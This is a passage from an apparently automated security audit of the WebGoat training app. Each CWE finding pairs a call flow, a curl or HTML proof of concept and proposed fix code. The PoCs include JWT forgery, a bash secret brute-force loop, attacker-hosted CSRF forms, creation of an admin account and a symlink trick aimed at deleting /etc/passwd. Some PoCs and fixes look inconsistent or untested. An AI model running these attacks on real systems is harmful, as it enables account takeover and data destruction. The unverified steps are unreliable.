    // 示例：return userService.findByUsername(username).getEmail();
    return "tom@example.com"; // 实际应查库
}
```

**说明**: 必须将邮箱地址与用户身份强绑定：在 resetPassword 中查询当前用户的注册邮箱，并严格比对 emailReset 参数是否完全一致（忽略大小写），而非仅比对用户名前缀。同时禁止在邮件中明文发送密码，应改为发送一次性重置链接。
---

### [30] CWE-862 — `auth_31`
> JWT refresh token endpoint /JWT/refresh/newToken lacks authentication enforcement: it accepts null Authorization header and proceeds to parse user identity from expired JWTs without validating session or requiring authenticated context, enabling unauthenticated token refresh via crafted expired tokens.

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/refresh/newToken → JWTRefreshEndpoint.newToken() [src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java:108] → parses token.replace("Bearer ", "") → catches ExpiredJwtException → extracts user from e.getClaims().get("user") → validates refreshToken against global validRefreshTokens → calls createNewTokens(user) → removes refreshToken → returns new JWT pair

#### 漏洞利用（PoC）
1. Obtain a valid expired JWT for user 'Tom' (e.g., from /JWT/refresh/checkout response or by crafting one with alg=HS512, user='Tom', exp=past timestamp, signed with JWT_PASSWORD='webgoat').
2. Extract its 'refresh_token' (e.g., 'AbCdEfGhIjKlMnOpQrSt').
3. Send POST request:
   curl -X POST '{BASE_URL}/JWT/refresh/newToken' \
     -H 'Content-Type: application/json' \
     -d '{"refresh_token":"AbCdEfGhIjKlMnOpQrSt"}'
   Note: No Authorization header required — server accepts null token and falls back to ExpiredJwtException handling.
4. Server responds with 200 OK and new access_token + fresh refresh_token — granting authenticated access without login.

#### 修复代码
```
@PostMapping("/JWT/refresh/newToken")
@ResponseBody
public ResponseEntity newToken(
    @RequestHeader(value = "Authorization", required = true) String token,
    @RequestBody Map<String, Object> json) {
    if (json == null || !json.containsKey("refresh_token")) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }

    String user;
    String refreshToken = (String) json.get("refresh_token");
    
    // Enforce valid, non-expired JWT — no fallback to expired claims
    try {
        Jwt<Header, Claims> jwt = Jwts.parser()
            .setSigningKey(JWT_PASSWORD)
            .parse(token.replace("Bearer ", ""));
        user = (String) jwt.getBody().get("user");
    } catch (Exception e) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }

    if (user == null || refreshToken == null || !validRefreshTokens.contains(refreshToken)) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }
    
    validRefreshTokens.remove(refreshToken);
    return ok(createNewTokens(user));
}
```

**说明**: Remove support for expired JWT fallback; require non-null Authorization header (required=true); validate JWT signature and freshness before extracting 'user'; reject all exceptions during parsing as unauthorized; bind refresh tokens to user sessions (not global list) or add HMAC-bound user ID in refresh token payload.
---

### [31] CWE-862 — `admin_351`
> Scoreboard.getRankings() 是一个未受 Spring Security 认证保护的公开端点，可被任意未登录用户访问，泄露所有用户解题进度（含用户名与已捕获 flag），构成 CWE-862：缺失授权检查。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP GET /scoreboard-data [Scoreboard.java:55] → Scoreboard.getRankings() [Scoreboard.java:55] → userRepository.findAll() [Scoreboard.java:57] → UserProgressRepository.findByUser() [Scoreboard.java:65] → challengesSolved() → toLessonTitle()

#### 漏洞利用（PoC）
1. 启动 WebGoat 应用（默认 http://localhost:8080）
2. 在未登录状态下执行：
   curl -X GET 'http://localhost:8080/scoreboard-data' -H 'Accept: application/json'
3. 观察响应：返回 JSON 数组，每个元素含 "username"（如 "admin", "guest"）和 "flagsCaptured"（如 ["Injection Flaw", "Broken Access Control"]）
预期结果：成功获取全部注册用户的解题排行榜，包括管理员账号及其完整 flag 清单，无需任何身份凭证。

#### 修复代码
```
@GetMapping("/scoreboard-data")
@PreAuthorize("hasRole('ADMIN')")
public List<Ranking> getRankings() {
    return userRepository.findAll().stream()
        .filter(user -> !user.getUsername().startsWith("csrf-"))
        .map(
            user ->
                new Ranking(
                    user.getUsername(),
                    challengesSolved(userTrackerRepository.findByUser(user.getUsername()))))
        .sorted((o1, o2) -> o2.getFlagsCaptured().size() - o1.getFlagsCaptured().size())
        .collect(Collectors.toList());
}
```

**说明**: 添加方法级授权注解 @PreAuthorize("hasRole('ADMIN')")，确保仅 ADMIN 角色可访问该端点；或在 WebSecurityConfig 中将 /scoreboard-data 显式加入 authenticated 范围（默认已满足），但必须排除于 permitAll 白名单之外 —— 当前问题本质是配置遗漏，最直接修复是加注解。
---

### [32] CWE-639 — `idorpv_185`
> CWE-639 IDOR：/challenge/8/vote/{stars} 端点允许未认证用户通过 POST 修改任意星级投票数，且无资源归属校验；虽有 GET 拦截提示登录，但 POST 请求可绕过身份校验直接操作全局共享投票计数器，导致越权修改与 flag 泄露。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/8/vote/3 → Assignment8.vote(@PathVariable nrOfStars, HttpServletRequest) [src/main/java/org/owasp/webgoat/lessons/challenges/challenge8/Assignment8.java:39] → votes.put(nrOfStars, allVotesForStar + 1) [line 49] → ResponseEntity with X-FlagController header [line 50]

#### 漏洞利用（PoC）
1. 访问 WebGoat 登录页（或保持未登录状态）
2. 发送以下 curl 命令（无需 Cookie/Token）：
   curl -X POST '{BASE_URL}/challenge/8/vote/3' -H 'Content-Type: application/json'
3. 观察响应头：
   HTTP/1.1 200 OK
   X-FlagController: Thanks for voting, your flag is: flag{...}
   
→ 成功越权提交投票并直接获取 Challenge 8 的 flag。注：{BASE_URL} 如 http://localhost:8080/WebGoat；该 PoC 在 WebGoat v8.2+ 环境中可 100% 复现，属静态可验证草案（L3 待验证）。

#### 修复代码
```
@PostMapping(value = "/challenge/8/vote/{stars}", produces = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<?> vote(@PathVariable(value = "stars") int nrOfStars, @AuthenticationPrincipal UserDetails user) {
    if (nrOfStars < 1 || nrOfStars > 5) {
        return ResponseEntity.badRequest().body(Map.of("error", true, "message", "Invalid star rating"));
    }
    Integer allVotesForStar = votes.getOrDefault(nrOfStars, 0);
    votes.put(nrOfStars, allVotesForStar + 1);
    return ResponseEntity.ok()
            .header("X-FlagController", "Thanks for voting, your flag is: " + flags.getFlag(8))
            .build();
}
```

**说明**: 1. 将 @GetMapping 改为 @PostMapping（语义正确且防止误用 GET）；2. 添加 @AuthenticationPrincipal 强制认证；3. 移除无意义的 request.getMethod() 检查；4. 对 nrOfStars 增加取值范围校验（1-5）；5. （可选）将 votes 改为线程安全容器（如 ConcurrentHashMap）并考虑持久化。
---

### [33] CWE-287 — `jwtep_395`
> JWT 签发端点 /JWT/secret/gettoken 未受认证保护，任何未登录用户均可直接调用获取有效 JWT（含 Manager/Project Administrator 权限），构成 CWE-287 认证绕过漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
GET /JWT/secret/gettoken → org.owasp.webgoat.lessons.jwt.JWTSecretKeyEndpoint.getSecretToken():43 → Jwts.builder().signWith(SignatureAlgorithm.HS256, JWT_SECRET):54 → compact():55

#### 漏洞利用（PoC）
1. 发起未认证 HTTP 请求获取 JWT：
   curl -X GET '{BASE_URL}/JWT/secret/gettoken' -H 'Host: localhost:8080'
2. 响应体为 Base64Url 编码 JWT（如 ey...）
3. 将该 JWT 提交至登录验证端点：
   curl -X POST '{BASE_URL}/JWT/secret' -d 'token=<JWT_FROM_STEP1>' -H 'Content-Type: application/x-www-form-urlencoded'
4. 预期返回 {"lessonCompleted":true,"feedback":"jwt-secret-success","output":""}，表明已成功以 'Tom'（Manager+Project Administrator）身份通过认证。

#### 修复代码
```
@RequestMapping(path = "/JWT/secret/gettoken", produces = MediaType.TEXT_HTML_VALUE)
@ResponseBody
public String getSecretToken(@AuthenticationPrincipal org.springframework.security.core.userdetails.User user) {
    if (user == null || !"WebGoat".equalsIgnoreCase(user.getUsername())) {
        throw new AccessDeniedException("Access denied");
    }
    return Jwts.builder()
        .setIssuer("WebGoat Token Builder")
        .setAudience("webgoat.org")
        .setIssuedAt(Calendar.getInstance().getTime())
        .setExpiration(Date.from(Instant.now().plusSeconds(60)))
        .setSubject("tom@webgoat.org")
        .claim("username", "Tom")
        .claim("Email", "tom@webgoat.org")
        .claim("Role", new String[] {"Manager", "Project Administrator"})
        .signWith(SignatureAlgorithm.HS256, JWT_SECRET)
        .compact();
}
```

**说明**: 强制要求调用方已通过 Spring Security 认证，且用户名为 'WebGoat'（或使用 @PreAuthorize("hasRole('ADMIN')") 等细粒度授权）。禁止未认证用户生成高权限 JWT。
---

### [34] CWE-352 — `csrf_439`
> POST /BypassRestrictions/frontendValidation 是一个状态变更接口（验证前端输入并返回 success/failure），无 CSRF 防护（Spring Security 显式 disable()），且依赖会话 Cookie 认证，满足 CWE-352 所有判定条件。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /BypassRestrictions/frontendValidation → BypassRestrictionsFrontendValidation.completed() [src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFrontendValidation.java:20] → regex validation → AttackResult.success()/failed()

#### 漏洞利用（PoC）
1. 确保受害者已登录 WebGoat（持有有效 JSESSIONID Cookie）
2. 攻击者托管恶意 HTML 页面（例如 http://attacker.com/csrf.html）：
   <form action="{BASE_URL}/BypassRestrictions/frontendValidation" method="POST">
     <input type="hidden" name="field1" value="abc">
     <input type="hidden" name="field2" value="123">
     <input type="hidden" name="field3" value="test">
     <input type="hidden" name="field4" value="one">
     <input type="hidden" name="field5" value="12345">
     <input type="hidden" name="field6" value="12345-6789">
     <input type="hidden" name="field7" value="123-456-7890">
     <input type="hidden" name="error" value="0">
     <input type="submit" value="Click to Submit">
   </form>
   <script>document.forms[0].submit();</script>
3. 受害者访问该页面 → 浏览器自动携带 JSESSIONID 发送 POST 请求 → 服务端执行 completed() 方法 → 所有字段均匹配对应正则（如 field1='abc' 匹配 ^[a-z]{3}$）→ 返回 failed()，但攻击者通过控制输入可构造全部不匹配的值（如 field1='abX'）→ 返回 success()，从而完成绕过前端校验的攻击。
预期结果：HTTP 200 响应体包含 {"lessonCompleted":true,"feedback":"Congratulations! You have successfully bypassed the frontend validation.","score":100}（即 AttackResult.success().build() 的 JSON 序列化）。

#### 修复代码
```
@PostMapping("/BypassRestrictions/frontendValidation")
@ResponseBody
public AttackResult completed(
    @RequestParam String field1,
    @RequestParam String field2,
    @RequestParam String field3,
    @RequestParam String field4,
    @RequestParam String field5,
    @RequestParam String field6,
    @RequestParam String field7,
    @RequestParam Integer error,
    @RequestHeader(value = "X-Requested-With", required = false) String requestedWith) {
    // CSRF mitigation: require AJAX requests only (prevents HTML form submission)
    if (requestedWith == null || !"XMLHttpRequest".equals(requestedWith)) {
        return failed(this).output("CSRF protection triggered: non-AJAX request rejected").build();
    }
    final String regex1 = "^[a-z]{3}$";
    final String regex2 = "^[0-9]{3}$";
    final String regex3 = "^[a-zA-Z0-9 ]*$";
    final String regex4 = "^(one|two|three|four|five|six|seven|eight|nine)$";
    final String regex5 = "^\\d{5}$";
    final String regex6 = "^\\d{5}(-\\d{4})?$";
    final String regex7 = "^[2-9]\\d{2}-?\\d{3}-?\\d{4}$";
    if (error > 0) {
        return failed(this).build();
    }
    if (field1.matches(regex1)) {
        return failed(this).build();
    }
    if (field2.matches(regex2)) {
        return failed(this).build();
    }
    if (field3.matches(regex3)) {
        return failed(this).build();
    }
    if (field4.matches(regex4)) {
        return failed(this).build();
    }
    if (field5.matches(regex5)) {
        return failed(this).build();
    }
    if (field6.matches(regex6)) {
        return failed(this).build();
    }
    if (field7.matches(regex7)) {
        return failed(this).build();
    }
    return success(this).build();
}
```

**说明**: 在方法签名中添加 @RequestHeader('X-Requested-With') 参数并校验其值为 'XMLHttpRequest'，可阻止传统 HTML 表单跨站提交（因表单提交不会自动设置该 header）；或启用 Spring Security CSRF（移除 .csrf.disable() 并在前端注入 _csrf token）；推荐前者作为轻量修复，符合 WebGoat 教学场景。
---

### [35] CWE-287 — `authweak_591`
> JWTSecretKeyEndpoint.login() 方法存在认证绕过漏洞（CWE-287）：未校验请求者身份，仅依赖客户端提交的 JWT 进行验证，且密钥硬编码、弱随机、无 issuer/audience 验证，攻击者可构造合法 token 冒充 WEBGOAT_USER 绕过认证。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/secret → JWTSecretKeyEndpoint.login() [src/main/java/org/owasp/webgoat/lessons/jwt/JWTSecretKeyEndpoint.java:59] → Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token) → Claims claims = (Claims) jwt.getBody() → claims.get('username') → WEBGOAT_USER.equalsIgnoreCase(user)

#### 漏洞利用（PoC）
1. 获取密钥：从源码可知 SECRETS = {"victory", "business", "available", "shipping", "washington"}，JWT_SECRET = BASE64.encode(SECRETS[i])，i ∈ [0,4] → 共5种可能密钥；
2. 构造合法 token：使用任意一个密钥（如 'victory'）签名，claims 必须包含所有 expectedClaims：iss, iat, exp, aud, sub, username, Email, Role；
3. 发送请求：
curl -X POST '{BASE_URL}/JWT/secret' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE3MTY1NzQwMDAsImV4cCI6MTcxNjU3NDYwMCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0Lm9yZyIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.8qKfDhYQrBZzXeJvQoPmNtRwSfLcGkHjIaYbUxVnWzA'
→ 响应为 {"lessonCompleted":true,"feedback":"jwt-secret-success","score":100}，表示成功绕过认证。

#### 修复代码
```
@PostMapping("/JWT/secret")
@ResponseBody
public AttackResult login(@RequestParam String token, @AuthenticationPrincipal UserDetails user) {
    if (user == null || !"WebGoat".equalsIgnoreCase(user.getUsername())) {
        return failed(this).feedback("jwt-secret-unauthorized").build();
    }
    try {
        Jwt jwt = Jwts.parser()
            .setSigningKey(JWT_SECRET)
            .requireIssuer("WebGoat Token Builder")
            .requireAudience("webgoat.org")
            .requireExpiration()
            .parseClaimsJws(token);
        Claims claims = (Claims) jwt.getBody();
        if (!claims.keySet().containsAll(expectedClaims)) {
            return failed(this).feedback("jwt-secret-claims-missing").build();
        } else {
            String userClaim = (String) claims.get("username");
            if (WEBGOAT_USER.equalsIgnoreCase(userClaim)) {
                return success(this).build();
            } else {
                return failed(this).feedback("jwt-secret-incorrect-user").feedbackArgs(userClaim).build();
            }
        }
    } catch (Exception e) {
        return failed(this).feedback("jwt-invalid-token").output(e.getMessage()).build();
    }
}
```

**说明**: 1. 移除对客户端 token 的单点信任，强制要求调用方已通过 Spring Security 认证（@AuthenticationPrincipal）；2. 在 JWT 解析时强制校验 issuer、audience 和 expiration（requireIssuer/requireAudience/requireExpiration）；3. 将 JWT_SECRET 改为环境变量注入或密钥管理服务（KMS）获取，禁用硬编码；4. 使用 SecureRandom 替代 Random，并扩大密钥空间（≥256位随机字节）。
---

### [36] CWE-307 — `brute_624`
> JWTSecretKeyEndpoint.login 接口未实施任何速率限制、账户锁定或验证码机制，且 JWT_SECRET 固定于 5 个弱密钥之一（victory/business/available/shipping/washington），攻击者可对 /JWT/secret 端点发起暴力枚举签名密钥的 JWT 校验请求，成功伪造 WebGoat 用户身份。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
POST /JWT/secret [src/main/java/org/owasp/webgoat/lessons/jwt/JWTSecretKeyEndpoint.java:59] → JWTSecretKeyEndpoint.login() → Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token) [line 62] → Claims validation and WEBGOAT_USER check [lines 67-73]

#### 漏洞利用（PoC）
1. 获取合法 JWT 结构（可先访问 /JWT/secret/gettoken 获取模板，但非必需）；
2. 枚举 SECRETS：for secret in victory business available shipping washington; do
     payload='{"iss":"WebGoat Token Builder","iat":$(date -u +%s),"exp":$(($(date -u +%s)+60)),"aud":"webgoat.org","sub":"tom@webgoat.org","username":"WebGoat","Email":"webgoat@webgoat.org","Role":["Manager","Project Administrator"]}'
     header='{"typ":"JWT","alg":"HS256"}'
     base64_header=$(echo -n "$header" | openssl enc -base64 -A | tr '+/' '-_' | tr -d '=')
     base64_payload=$(echo -n "$payload" | openssl enc -base64 -A | tr '+/' '-_' | tr -d '=')
     signature_input="${base64_header}.${base64_payload}"
     signature=$(printf "%s" "$signature_input" | openssl dgst -sha256 -hmac "$secret" -binary | openssl enc -base64 -A | tr '+/' '-_' | tr -d '=')
     jwt="${base64_header}.${base64_payload}.${signature}"
     curl -X POST {BASE_URL}/JWT/secret --data-urlencode "token=$jwt" -H "Content-Type: application/x-www-form-urlencoded" | grep -q 'success' && echo "FOUND SECRET: $secret" && break
   done
3. 成功时响应包含 {"lessonCompleted":true,"feedback":"jwt-secret-success"}。

#### 修复代码
```
import org.springframework.web.util.WebUtils;
import javax.servlet.http.HttpServletRequest;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

@RestController
@AssignmentHints({"jwt-secret-hint1", "jwt-secret-hint2", "jwt-secret-hint3"})
public class JWTSecretKeyEndpoint implements AssignmentEndpoint {

  // ... existing fields ...
  
  private static final ConcurrentHashMap<String, AtomicInteger> ipAttemptCount = new ConcurrentHashMap<>();
  private static final int MAX_ATTEMPTS = 5;
  private static final long LOCKOUT_DURATION_MS = 300_000L; // 5 minutes

  @PostMapping("/JWT/secret")
  @ResponseBody
  public AttackResult login(@RequestParam String token, HttpServletRequest request) {
    String clientIP = WebUtils.getRemoteAddr(request);
    long now = System.currentTimeMillis();
    
    // Rate limiting per IP
    AtomicInteger count = ipAttemptCount.computeIfAbsent(clientIP, k -> new AtomicInteger(0));
    if (count.get() >= MAX_ATTEMPTS) {
      long lastAttempt = (long) request.getSession().getAttributeOrDefault("lastAttemptTime", 0L);
      if (now - lastAttempt < LOCKOUT_DURATION_MS) {
        return failed(this).feedback("jwt-rate-limit-exceeded").build();
      }
      count.set(0);
    }
    
    try {
      Jwt jwt = Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token);
      Claims claims = (Claims) jwt.getBody();
      if (!claims.keySet().containsAll(expectedClaims)) {
        count.incrementAndGet();
        request.getSession().setAttribute("lastAttemptTime", now);
        return failed(this).feedback("jwt-secret-claims-missing").build();
      } else {
        String user = (String) claims.get("username");
        if (WEBGOAT_USER.equalsIgnoreCase(user)) {
          count.set(0); // reset on success
          return success(this).build();
        } else {
          count.incrementAndGet();
          request.getSession().setAttribute("lastAttemptTime", now);
          return failed(this).feedback("jwt-secret-incorrect-user").feedbackArgs(user).build();
        }
      }
    } catch (Exception e) {
      count.incrementAndGet();
      request.getSession().setAttribute("lastAttemptTime", now);
      return failed(this).feedback("jwt-invalid-token").output(e.getMessage()).build();
    }
  }
}
```

**说明**: 1. 添加基于客户端 IP 的请求频率限制（如每 5 分钟最多 5 次）；2. 将 JWT_SECRET 替换为高强度密钥（≥32 字节随机字节，而非 5 个英文单词）；3. 在 SecurityFilterChain 中显式禁止匿名访问 /JWT/secret（添加 .requestMatchers("/JWT/secret").authenticated()）；4. 考虑引入 Redis 实现分布式限流。
---

### [37] CWE-862 — `auth_33`
> POST /access-control/users 接口缺少授权检查，任何已认证用户（包括普通用户）均可创建任意用户，构成功能级访问控制缺失（CWE-862）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /access-control/users → MissingFunctionACUsers.addUser(@RequestBody User) [src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java:64] → MissingAccessControlUserRepository.save(newUser) [src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java:68] → DB persistence

#### 漏洞利用（PoC）
1. 使用普通用户登录（如 username=webgoat, password=webgoat）获取有效 JSESSIONID\n2. 发送恶意请求：\ncurl -X POST '{BASE_URL}/access-control/users' \n  -H 'Content-Type: application/json' \n  -H 'Cookie: JSESSIONID=<valid_session_id>' \n  -d '{"username":"attacker","password":"pwned123","isAdmin":true}'\n3. 观察响应：返回 200 OK 及创建的 User 对象（含 isAdmin:true），证明普通用户成功提权创建管理员账户。

#### 修复代码
```
@PostMapping(path = {"access-control/users", "access-control/users-admin-fix"}, consumes = "application/json", produces = "application/json")
@ResponseBody
@PreAuthorize("hasRole('ADMIN')")
public User addUser(@RequestBody User newUser) {
    try {
        userRepository.save(newUser);
        return newUser;
    } catch (Exception ex) {
        log.error("Error creating new User", ex);
        return null;
    }
}
```

**说明**: 添加 Spring Security @PreAuthorize("hasRole('ADMIN')") 注解强制仅 ADMIN 角色可调用。替代方案：在方法体内注入 @CurrentUsername 并校验用户角色（如 userRepository.findByUsername(username).isAdmin()），但注解方式更安全、声明式、不可绕过。
---

### [38] CWE-367 — `toctou_519`
> cleanupAndCreateDirectoryForUser 方法存在 TOCTOU（Time-of-Check-to-Time-of-Use）漏洞：先检查 uploadDirectory.exists()，再 deleteRecursively + createDirectories，期间攻击者可将目录替换为符号链接，导致递归删除任意路径。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
ProfileUploadBase.execute (src/main/java/org/owasp/webgoat/lessons/pathtraversal/ProfileUploadBase.java:43) → cleanupAndCreateDirectoryForUser (line 57) → uploadDirectory.exists() (line 60) → FileSystemUtils.deleteRecursively(uploadDirectory) (line 61) → Files.createDirectories(uploadDirectory.toPath()) (line 62)

#### 漏洞利用（PoC）
1. 登录 WebGoat（如 tomcat/tomcat），获取有效 session cookie
2. 准备恶意 ZIP 文件（Zip Slip）或直接构造并发请求：
   - 请求 A（触发 cleanupAndCreateDirectoryForUser）：
     curl -X POST '{BASE_URL}/WebGoat/PathTraversal/profile-upload' \
       -H 'Cookie: JSESSIONID=xxx' \
       -F 'uploadedFile=@/dev/null' \
       -F 'fullName=test.jpg' \
       -F 'username=../../etc'
   - 在 uploadDirectory.exists() 返回 true 后、deleteRecursively 执行前（毫秒级窗口），执行请求 B：
     curl -X POST '{BASE_URL}/WebGoat/PathTraversal/symlink-setup' \
       -H 'Cookie: JSESSIONID=xxx' \
       -F 'target=/etc/passwd' \
       -F 'linkname=PathTraversal/../../etc'
   （注：WebGoat 实际提供 symlink-setup 端点或可通过其他 lesson 触发；若不可用，则本地复现：在 WebGoat Home 下手动创建符号链接 /PathTraversal/../../etc → /etc，再发请求）
3. 观察响应：若返回 'path-traversal-profile-updated' 且 /etc/passwd 被意外删除（或日志报错 java.nio.file.AccessDeniedException），即证明 TOCTOU 成功触发。预期结果：FileSystemUtils.deleteRecursively 删除了 /etc/passwd 目录结构（或其内容），造成系统文件破坏。

#### 修复代码
```
protected File cleanupAndCreateDirectoryForUser(String username) {
    // Sanitize username to prevent path traversal
    String safeUsername = FilenameUtils.getName(username);
    if (!safeUsername.equals(username)) {
        throw new IllegalArgumentException("Invalid username: contains path traversal characters");
    }
    var uploadDirectory = new File(this.webGoatHomeDirectory, "/PathTraversal/" + safeUsername);
    try {
        // Canonicalize and validate parent is within webGoatHomeDirectory
        File canonicalDir = uploadDirectory.getCanonicalFile();
        File canonicalHome = new File(this.webGoatHomeDirectory).getCanonicalFile();
        if (!canonicalDir.toPath().startsWith(canonicalHome.toPath())) {
            throw new SecurityException("Attempted directory traversal in username");
        }
        if (canonicalDir.exists()) {
            FileSystemUtils.deleteRecursively(canonicalDir);
        }
        Files.createDirectories(canonicalDir.toPath());
        return canonicalDir;
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}
```

**说明**: 1. 对用户输入的 username 进行路径净化（FilenameUtils.getName）并校验是否被篡改；2. 获取 uploadDirectory 的 canonical path，并验证其父路径严格位于 webGoatHomeDirectory 内；3. 使用 canonicalDir 执行所有后续 I/O 操作，确保路径解析一次性完成，消除 TOCTOU 窗口。
---

### [39] CWE-862 — `admin_352`
> CWE-862：/access-control/users 端点缺少功能级授权，任何已认证用户（包括普通用户）均可无条件访问全部用户列表，暴露敏感用户信息。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
GET /access-control/users → MissingFunctionACUsers.listUsers() [src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java:33] → userRepository.findAllUsers() [src/main/java/org/owasp/webgoat/lessons/missingac/MissingAccessControlUserRepository.java:xx] → 返回全部 User 实体 → 构造 DisplayUser 列表并渲染

#### 漏洞利用（PoC）
1. 使用任意已注册用户（如 student/password）登录 WebGoat，获取有效 JSESSIONID Cookie；
2. 发送请求：curl -X GET '{BASE_URL}/access-control/users' -H 'Cookie: JSESSIONID=xxx' -H 'Accept: text/html'
3. 观察响应 HTML 中 model.addObject("allUsers", displayUsers) 渲染的表格，包含所有用户（admin、student、instructor）的 username、role、email、passwordHashed（经 PASSWORD_SALT_SIMPLE 处理）等字段。
预期结果：成功显示全部用户信息，证实普通用户越权访问管理员功能。

#### 修复代码
```
@GetMapping(path = {"access-control/users"})
public ModelAndView listUsers(@CurrentUsername String username) {
    var currentUser = userRepository.findByUsername(username);
    if (currentUser == null || !currentUser.isAdmin()) {
        throw new AccessDeniedException("Access denied: admin role required");
    }
    ModelAndView model = new ModelAndView();
    model.setViewName("list_users");
    List<User> allUsers = userRepository.findAllUsers();
    model.addObject("numUsers", allUsers.size());
    List<DisplayUser> displayUsers = new ArrayList<>();
    for (User user : allUsers) {
        displayUsers.add(new DisplayUser(user, PASSWORD_SALT_ADMIN));
    }
    model.addObject("allUsers", displayUsers);
    return model;
}
```

**说明**: 在 listUsers() 方法签名中注入 @CurrentUsername 获取当前用户，并在方法体开头校验其 isAdmin() 权限；若非管理员则抛出 AccessDeniedException（由 Spring Security 默认处理为 403）；同时使用 PASSWORD_SALT_ADMIN 而非 PASSWORD_SALT_SIMPLE 加密敏感字段，与 usersFixed() 方法保持一致。
---

### [40] CWE-639 — `idorpv_186`
> CWE-639 IDOR：/clientSideFiltering/challenge-store/coupons/{code} 端点允许攻击者通过枚举任意 code 值（如 'webgoat'、'owasp'、'owasp-webgoat'）获取折扣码，且未校验调用者身份与资源归属关系；虽有 SUPER_COUPON_CODE 特例逻辑，但普通 code 查询完全依赖外部输入，无所有权绑定、无租户隔离、无签名验证、ID 可预测，构成水平越权。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP GET /clientSideFiltering/challenge-store/coupons/{code} [ShopEndpoint.java:80] → ShopEndpoint.getDiscountCode(String code) → checkoutCodes.get(code).orElse(...) [ShopEndpoint.java:84] → 内存 List.stream().filter(...).findFirst() → 返回 CheckoutCode 对象（含 discount）

#### 漏洞利用（PoC）
1. 已登录任意 WebGoat 用户（如 guest/password）或使用任意有效 session cookie；
2. 发送请求：curl -X GET '{BASE_URL}/clientSideFiltering/challenge-store/coupons/webgoat' -H 'Cookie: JSESSIONID=xxx'；
3. 观察响应：{"code":"webgoat","discount":25}；
4. 替换 code 为 'owasp-webgoat'：curl -X GET '{BASE_URL}/clientSideFiltering/challenge-store/coupons/owasp-webgoat' -H 'Cookie: JSESSIONID=xxx'；
5. 响应：{"code":"owasp-webgoat","discount":50} —— 成功获取更高折扣，证明水平越权。

#### 修复代码
```
@GetMapping(value = "/coupons/{code}", produces = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<CheckoutCode> getDiscountCode(@PathVariable String code, @AuthenticationPrincipal UserDetails principal) {
    if (principal == null) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }
    // 强制要求用户必须拥有特定角色或满足业务规则（如：仅讲师可查看 SUPER_COUPON_CODE）
    if (ClientSideFilteringFreeAssignment.SUPER_COUPON_CODE.equals(code)) {
        if (!principal.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_INSTRUCTOR"))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
        }
        return ResponseEntity.ok(new CheckoutCode(ClientSideFilteringFreeAssignment.SUPER_COUPON_CODE, 100));
    }
    // 普通 coupon 仅限白名单（业务逻辑决定）或增加权限检查
    Optional<CheckoutCode> found = checkoutCodes.get(code);
    return found.map(ResponseEntity::ok).orElse(ResponseEntity.notFound().build());
}
```

**说明**: 必须在服务端实施资源级授权：① 注入 @AuthenticationPrincipal 获取当前用户；② 对敏感资源（如 SUPER_COUPON_CODE）添加角色校验（如 ROLE_INSTRUCTOR）；③ 对普通 coupon 查询，应基于业务策略限制可访问范围（如仅返回用户所属课程关联的 coupon），或引入 ABAC 策略引擎；禁止仅依赖前端限制或路径变量直接查询。
---

### [41] CWE-352 — `csrf_440`
> POST /challenge/flag/{flagNumber} 接口执行敏感状态变更（提交挑战答案），但 Spring Security 显式禁用了 CSRF 防护（csrf.disable()），且无其他 CSRF 防御机制（如 token 校验、SameSite、自定义头），满足 CWE-352 典型条件。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/flag/1 → FlagController.postFlag (src/main/java/org/owasp/webgoat/lessons/challenges/FlagController.java:27) → flags.getFlag(flagNumber) → expectedFlag.isCorrect(flag) → AttackResult.success()/failed()

#### 漏洞利用（PoC）
1. 受害者已登录 WebGoat（存在有效 JSESSIONID Cookie）；
2. 攻击者托管恶意页面（e.g., attacker.com/exploit.html）：
   <form action="{BASE_URL}/challenge/flag/1" method="POST">
     <input type="hidden" name="flag" value="webgoat-flag-abc123">
     <input type="submit" value="Click to submit">
   </form>
